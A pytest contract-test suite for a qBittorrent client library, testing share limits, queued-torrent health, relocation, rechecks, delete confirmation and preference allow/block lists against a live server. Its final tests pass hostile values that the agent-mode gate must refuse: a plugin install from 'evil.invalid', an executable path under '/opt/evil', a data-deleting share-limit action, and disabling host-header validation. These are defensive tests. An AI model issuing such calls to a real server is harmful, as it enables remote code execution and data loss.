"""Scenarios named after real failures.

Each of these reproduces something that went wrong in practice managing a live
media pipeline. They exist because none of them is expressible as a unit test:
they are all behaviours of a running qBittorrent, not signatures.
"""

from __future__ import annotations

import shutil
import time

import peering
import pytest
from harness import Swarm
from mktorrent import build, infohash, make_content

from qbtkit import errors
from qbtkit.client import Client

pytestmark = pytest.mark.contract

CONTENT = {"ep01.bin": 1 << 20, "ep02.bin": 1 << 20, "ep03.bin": 1 << 20}


def _content_on(node, name: str = "pack", files: dict[str, int] | None = None):
    root = node.dir / "downloads" / name
    make_content(root, files or CONTENT)
    data = build(root, piece_length=1 << 18)
    return data, infohash(data), root


def _wait(fn, timeout: float = 60.0, interval: float = 0.5):
    deadline = time.time() + timeout
    last = None
    while time.time() < deadline:
        last = fn()
        if last:
            return last
        time.sleep(interval)
    return last


def _is_stopped(state: str) -> bool:
    """qBittorrent 4.x reports `pausedUP`/`pausedDL` where 5.x says `stopped*`.

    The rename that hit `torrents/pause` -> `torrents/stop` hit the state
    strings too, so a literal `startswith("stopped")` silently fails every
    share-limit assertion on 4.6 while looking like a behaviour difference.
    """
    return state.startswith(("stopped", "paused"))


def _one(c: Client) -> dict:
    info = c.call("torrents/info")
    assert info, "expected exactly one torrent"
    return info[0]


# --------------------------------------------------------------------------- #
# stop-on-complete, and the thing that silently defeats it


def test_share_limits_stop_a_torrent_on_completion(seeder: Client, swarm: Swarm) -> None:
    """max_seeding_time=0 should park a finished torrent instead of seeding."""
    seeder.call(
        "app/setPreferences",
        json={
            "max_seeding_time_enabled": True,
            "max_seeding_time": 0,
            "max_ratio_act": 0,
        },
    )
    data, ih, _ = _content_on(swarm.seeder, "share-limits")
    seeder.call("torrents/add", torrents=data, savepath="/downloads")

    stopped = _wait(
        lambda: (
            [t for t in seeder.call("torrents/info", hashes=ih) if _is_stopped(t["state"])]
            or None
        ),
        timeout=90,
    )
    assert stopped, f"never stopped on completion: {_one(seeder)['state']}"


def test_force_start_defeats_stop_on_complete(seeder: Client, swarm: Swarm) -> None:
    """A force-started torrent ignores share limits.

    This cost real confusion: stop-on-complete was configured and verified, yet
    two torrents kept seeding — because they had been force-started to get them
    past the queue, and force-start overrides share limits entirely.
    """
    seeder.call(
        "app/setPreferences",
        json={
            "max_seeding_time_enabled": True,
            "max_seeding_time": 0,
            "max_ratio_act": 0,
        },
    )
    data, ih, _ = _content_on(swarm.seeder, "forcestart")
    seeder.call("torrents/add", torrents=data, savepath="/downloads")
    _wait(
        lambda: (
            [t for t in seeder.call("torrents/info", hashes=ih) if t["progress"] >= 1.0] or None
        ),
        timeout=90,
    )
    seeder.call("torrents/setForceStart", hashes=ih, value=True)

    # Give the share-limit checker several cycles to run and be ignored.
    time.sleep(20)
    t = _one(seeder)
    assert t["force_start"] is True
    assert not _is_stopped(t["state"]), (
        "force-started torrents must keep seeding despite max_seeding_time=0 — "
        "if this ever stops, the documented trap no longer exists"
    )


# --------------------------------------------------------------------------- #
# the mistake that deleted healthy torrents


def test_a_queued_torrent_is_not_a_dead_one(leecher: Client, swarm: Swarm) -> None:
    """A queued torrent reports availability 0.0 and must not be judged dead.

    This is the bug that over-deleted 25 healthy downloads: the health rule
    `availability - progress <= 0.05` is only meaningful once a torrent has had
    a chance to connect. Queued torrents are not connected, so they look
    identical to a dead swarm.
    """
    leecher.call(
        "app/setPreferences",
        json={
            "queueing_enabled": True,
            "max_active_downloads": 1,
            "max_active_torrents": 1,
        },
    )
    for i in (1, 2, 3):
        data, _ih, _ = _content_on(swarm.leecher, f"q{i}", {"f.bin": 1 << 20})
        leecher.call("torrents/add", torrents=data, savepath="/downloads/other")

    queued = _wait(
        lambda: (
            # three torrents on purpose here, so this one is not scoped
            [t for t in leecher.call("torrents/info") if t["state"] == "queuedDL"] or None
        ),
        timeout=60,
    )
    assert queued, f"nothing queued: {[t['state'] for t in leecher.call('torrents/info')]}"
    for t in queued:
        assert t["availability"] == 0.0, (
            "a queued torrent reports availability 0.0; any health check must "
            "exclude non-connected states before calling a torrent dead"
        )
        assert t["progress"] < 1.0


# --------------------------------------------------------------------------- #
# moving data


def test_set_location_moves_partial_data_without_losing_progress(
    swarm: Swarm, leecher: Client
) -> None:
    """setLocation relocates a partially-complete torrent and keeps progress.

    The partial state is produced by grafting only some of the files into place
    and rechecking, rather than by half-finishing a transfer. That is both
    deterministic and faster, and it keeps this test about relocation instead of
    making it depend on peer connectivity it does not need.

    setLocation also returns *before* the move completes, so this polls for the
    path change and then rechecks, rather than assuming either.
    """
    data, ih, source = _content_on(swarm.leecher, "move-src")
    leecher.call("torrents/add", torrents=data, savepath="/downloads/move-a", stopped=True)
    _wait(lambda: leecher.call("torrents/info", hashes=ih) or None, timeout=20)

    # One of three files, so the torrent lands genuinely partial.
    dest = swarm.leecher.dir / "downloads" / "move-a" / "move-src"
    dest.mkdir(parents=True, exist_ok=True)
    first = sorted(source.iterdir())[0]
    shutil.copyfile(first, dest / first.name)

    leecher.call("torrents/recheck", hashes=ih)
    partial = _wait(
        lambda: (
            [
                t
                for t in leecher.call("torrents/info", hashes=ih)
                if "checking" not in t["state"].lower() and 0.0 < t["progress"] < 1.0
            ]
            or None
        ),
        timeout=90,
    )
    assert partial, f"never reached a partial state: {_one(leecher)}"
    before = partial[0]["completed"]

    leecher.call("torrents/setLocation", hashes=ih, location="/downloads/move-b")
    moved = _wait(
        lambda: (
            [
                t
                for t in leecher.call("torrents/info", hashes=ih)
                if t["save_path"].rstrip("/") == "/downloads/move-b"
            ]
            or None
        ),
        timeout=60,
    )
    assert moved, f"save_path never changed: {_one(leecher)['save_path']}"

    leecher.call("torrents/recheck", hashes=ih)
    settled = _wait(
        lambda: (
            [
                t
                for t in leecher.call("torrents/info", hashes=ih)
                if "checking" not in t["state"].lower()
            ]
            or None
        ),
        timeout=90,
    )
    assert settled
    assert settled[0]["completed"] >= before * 0.9, (
        f"progress regressed across the move: {before} -> {settled[0]['completed']}"
    )


def test_grafting_identical_data_recovers_progress(swarm: Swarm, leecher: Client) -> None:
    """Dropping matching files into place and rechecking recovers progress.

    The real case: eight partial downloads of the same release as a season pack.
    Copying them into the pack's folder and rechecking recovered most of the
    data. Most, not all — a pack's pieces span file boundaries, so the pieces
    straddling into neighbouring files cannot validate.
    """
    data, ih, source = _content_on(swarm.leecher, "graft-src")
    # Add the torrent pointing somewhere empty, so it starts at zero.
    leecher.call("torrents/add", torrents=data, savepath="/downloads/graft-dest", stopped=True)
    added = _wait(lambda: leecher.call("torrents/info") or None, timeout=20)
    assert added and added[0]["progress"] == 0.0

    dest = swarm.leecher.dir / "downloads" / "graft-dest" / "graft-src"
    dest.mkdir(parents=True, exist_ok=True)
    for f in sorted(source.iterdir()):
        shutil.copyfile(f, dest / f.name)

    leecher.call("torrents/recheck", hashes=ih)
    done = _wait(
        lambda: (
            [
                t
                for t in leecher.call("torrents/info", hashes=ih)
                if "checking" not in t["state"].lower() and t["progress"] > 0.0
            ]
            or None
        ),
        timeout=90,
    )
    assert done, f"recheck recovered nothing: {_one(leecher)}"
    assert done[0]["progress"] > 0.9, (
        f"expected most pieces to validate, got {done[0]['progress']:.3f}"
    )


def test_recheck_rejects_a_size_mismatch(swarm: Swarm, leecher: Client) -> None:
    """Grafting a file of the wrong size must not be counted as progress.

    The size check is what stopped a different release being grafted in for
    real — its file was 1.06 GB against the pack's 1.87 GB, so its pieces would
    never have validated.
    """
    data, ih, _ = _content_on(swarm.leecher, "size-src")
    leecher.call("torrents/add", torrents=data, savepath="/downloads/size-dest", stopped=True)
    _wait(lambda: leecher.call("torrents/info") or None, timeout=20)

    dest = swarm.leecher.dir / "downloads" / "size-dest" / "size-src"
    dest.mkdir(parents=True, exist_ok=True)
    for name in CONTENT:
        (dest / name).write_bytes(b"\x00" * (1 << 19))  # half the right size

    leecher.call("torrents/recheck", hashes=ih)
    settled = _wait(
        lambda: (
            [
                t
                for t in leecher.call("torrents/info", hashes=ih)
                if "checking" not in t["state"].lower()
            ]
            or None
        ),
        timeout=90,
    )
    assert settled
    assert settled[0]["progress"] < 0.1, (
        f"wrong-sized files must not validate, got {settled[0]['progress']:.3f}"
    )


# --------------------------------------------------------------------------- #
# categories and safety


def test_category_with_auto_tmm_moves_data(leecher: Client, swarm: Swarm) -> None:
    """With automatic management on, setting a category relocates the files."""
    leecher.call("torrents/createCategory", category="tv", savePath="/downloads/TV")
    data, ih, _ = _content_on(swarm.leecher, "catpack")
    leecher.call("torrents/add", torrents=data, savepath="/downloads")
    _wait(lambda: leecher.call("torrents/info") or None, timeout=20)

    leecher.call("torrents/setAutoManagement", hashes=ih, enable=True)
    leecher.call("torrents/setCategory", hashes=ih, category="tv")
    moved = _wait(
        lambda: (
            [t for t in leecher.call("torrents/info", hashes=ih) if "TV" in t["save_path"]]
            or None
        ),
        timeout=60,
    )
    assert moved, f"category did not move the data: {_one(leecher)['save_path']}"
    assert moved[0]["category"] == "tv"


def test_destructive_delete_needs_confirmation_against_a_real_server(
    leecher: Client, swarm: Swarm
) -> None:
    """The gate must hold on the real path, not only in unit tests."""
    data, ih, _ = _content_on(swarm.leecher, "guarded")
    leecher.call("torrents/add", torrents=data, savepath="/downloads")
    _wait(lambda: leecher.call("torrents/info") or None, timeout=20)

    with pytest.raises(errors.ConfirmationRequired):
        leecher.call("torrents/delete", hashes=ih, deleteFiles=True)
    assert leecher.call("torrents/info"), "torrent must survive a refused delete"

    leecher.call("torrents/delete", hashes=ih, deleteFiles=True, confirm=True)
    gone = _wait(lambda: leecher.call("torrents/info") == [] or None, timeout=30)
    assert gone


# --------------------------------------------------------------------------- #
# "complete" does not mean "all files are on disk"


def test_progress_reaches_one_with_files_deselected(
    swarm: Swarm, leecher: Client, seeder: Client
) -> None:
    """A torrent reports progress 1.0 while deselected files were never fetched.

    Found by dogfooding: a season pack in the live queue showed `progress: 1`
    and `state: stoppedUP`, yet held only 3716 of 6516 pieces because four
    episodes had been set to priority 0. Anything that treats progress >= 1 as
    "every file of this torrent is on disk" — an importer, a safe-to-delete
    check — is wrong on exactly these torrents, and would delete a pack whose
    skipped files it never actually had.

    This pins down which fields do tell the truth, so callers have something
    sound to rely on.
    """
    data, ih, _ = _content_on(swarm.seeder, "deselect")
    seeder.call("torrents/add", torrents=data, savepath="/downloads")
    _wait(
        lambda: (
            [t for t in seeder.call("torrents/info", hashes=ih) if t["progress"] >= 1.0] or None
        ),
        timeout=90,
    )

    # Add stopped so nothing is fetched before the deselection is in place.
    leecher.call("torrents/add", torrents=data, savepath="/downloads", stopped=True)
    _wait(lambda: leecher.call("torrents/info", hashes=ih) or None, timeout=60)

    files = leecher.call("torrents/files", hash=ih)
    assert len(files) == 3, f"expected a 3-file pack, got {[f['name'] for f in files]}"
    skipped = sorted(f["name"] for f in files)[1]  # ep02.bin
    skipped_index = next(f["index"] for f in files if f["name"] == skipped)
    leecher.call("torrents/filePrio", hash=ih, id=str(skipped_index), priority=0)
    leecher.call("torrents/start", hashes=ih)

    assert peering.connect(
        leecher, seeder, ih, swarm.leecher.peer_address, swarm.seeder.peer_address
    ), "peers never connected"

    done = _wait(
        lambda: (
            [t for t in leecher.call("torrents/info", hashes=ih) if t["progress"] >= 1.0]
            or None
        ),
        timeout=120,
    )
    assert done, (
        "a torrent with a deselected file should still reach progress 1.0: "
        f"{leecher.call('torrents/info', hashes=ih)}"
    )

    t = done[0]
    files = leecher.call("torrents/files", hash=ih)
    by_name = {f["name"]: f for f in files}
    props = leecher.call("torrents/properties", hash=ih)

    # The trap itself.
    assert t["progress"] >= 1.0

    # What actually tells the truth, in order of how cheap it is to check.
    # Both come from the one listing call, so a caller never needs a per-torrent
    # round trip to notice the selection is partial.
    assert t["size"] < t["total_size"], (
        "torrents/info.size counts only the selected files while total_size is the "
        "whole torrent, so size < total_size is the cheap partial-selection flag"
    )
    if "pieces_have" in t:  # added to torrents/info in 5.2; absent on 4.6-5.1
        assert t["pieces_have"] < t["pieces_num"], (
            "the listing's own piece counts stay honest at progress 1.0"
        )
    assert t["size"] == sum(f["size"] for f in files if f["priority"] != 0)
    assert props["pieces_have"] < props["pieces_num"], (
        "properties exposes the honest piece count even at progress 1.0"
    )
    assert by_name[skipped]["priority"] == 0
    assert by_name[skipped]["progress"] < 1.0, (
        "the deselected file must not be complete, or the premise is wrong"
    )


def test_every_blocklisted_preference_key_actually_exists(seeder: Client) -> None:
    """A blocklist entry that matches no real key protects nothing.

    `web_ui_host_header_validation` was blocked for weeks. The real key is
    `web_ui_host_header_validation_enabled`, so the guard matched nothing and
    host-header validation — the thing standing between a mapped port and an
    open WebUI — could be switched off through the very call that claimed to
    refuse it. Spelling is load-bearing here, and only a real server can
    confirm it.
    """
    from qbtkit.spec.app import LOCKOUT_KEYS

    # qBittorrent accepts these on write but never hands them back on read,
    # which is the correct thing for it to do with a password. Their spelling
    # cannot be checked this way, so they are excluded explicitly rather than
    # by loosening the assertion for everything.
    write_only = {"web_ui_password"}

    # Keys qBittorrent grew later. Blocking one on a server that has never heard
    # of it guards nothing, but there is nothing to guard there either. Gating on
    # the measured version keeps the typo check strict everywhere the key exists,
    # rather than loosening the assertion for every key to accommodate one.
    # Measured: absent on WebAPI 2.9.3 (qBittorrent 4.6.7), present on 2.11.2
    # (5.0.2) and later.
    introduced_in = {"python_executable_path": (2, 11, 2)}

    prefs = seeder.call("app/preferences")
    phantom = sorted(
        k
        for k in LOCKOUT_KEYS - write_only
        if k not in prefs and seeder.version >= introduced_in.get(k, (0, 0, 0))
    )
    assert not phantom, (
        f"blocklisted keys that this server does not expose, so they guard "
        f"nothing: {phantom}. Check the spelling against app/preferences."
    )


def test_every_allowlisted_preference_key_actually_exists(seeder: Client) -> None:
    """A misspelled allowlist entry is worse than a misspelled blocklist one.

    A phantom blocklist key fails open for a key nobody can write anyway. A
    phantom *allowlist* key is dead weight that hides a real one: the key an
    agent actually needs stays refused, so the first symptom is a working call
    that stopped working, and the temptation is to widen the list rather than
    fix the spelling.
    """
    from qbtkit.spec.app import SAFE_PREF_KEYS

    # Keys qBittorrent renamed. Only one spelling exists on any given server, so
    # neither can be asserted outright; both stay on the allowlist so an agent
    # works across the supported range. Asserting "at least one" still catches a
    # typo in either half.
    renamed_pairs = (("add_stopped_enabled", "start_paused_enabled"),)

    prefs = seeder.call("app/preferences")
    for pair in renamed_pairs:
        assert any(k in prefs for k in pair), (
            f"neither spelling of {pair} exists on this server, so the allowlist "
            f"entry guards nothing and the agent path is broken for it"
        )

    aliases = {k for pair in renamed_pairs for k in pair}
    phantom = sorted(k for k in SAFE_PREF_KEYS - aliases if k not in prefs)
    assert not phantom, (
        f"allowlisted keys this server does not expose: {phantom}. Either the "
        f"spelling is wrong or they belong to a different qBittorrent version — "
        f"check against app/preferences before widening the list."
    )


def test_the_reported_deletion_and_execution_keys_are_refused(seeder: Client) -> None:
    """The two preference writes from the external report, against a real server
    that would accept them, through a client in agent mode."""
    from qbtkit.client import Client as RealClient

    agent = RealClient(
        seeder.url,
        username=seeder._username,
        password=seeder._password,
        agent=True,
        use_keychain=False,
    )
    try:
        before = seeder.call("app/preferences")
        with pytest.raises(errors.QbtError):
            agent.call(
                "app/setPreferences",
                json={
                    "max_seeding_time_enabled": True,
                    "max_seeding_time": 0,
                    "max_ratio_act": 3,
                },
            )
        with pytest.raises(errors.QbtError):
            agent.call("app/setPreferences", json={"python_executable_path": "/opt/evil/x.sh"})
        with pytest.raises(errors.QbtError):
            agent.call("search/installPlugin", sources="http://evil.invalid/p.py")
        after = seeder.call("app/preferences")
        for key in ("max_ratio_act", "max_seeding_time", "python_executable_path"):
            if key in before:
                assert after[key] == before[key], f"{key} was changed despite the gate"
    finally:
        agent.close()


def test_blocklist_refuses_the_real_host_header_key(seeder: Client) -> None:
    """The regression, end to end against a server that would have accepted it."""
    before = seeder.call("app/preferences")["web_ui_host_header_validation_enabled"]
    with pytest.raises(errors.QbtError):
        seeder.call(
            "app/setPreferences",
            json={"web_ui_host_header_validation_enabled": False},
        )
    after = seeder.call("app/preferences")["web_ui_host_header_validation_enabled"]
    assert before == after is True, "host-header validation must be untouched"
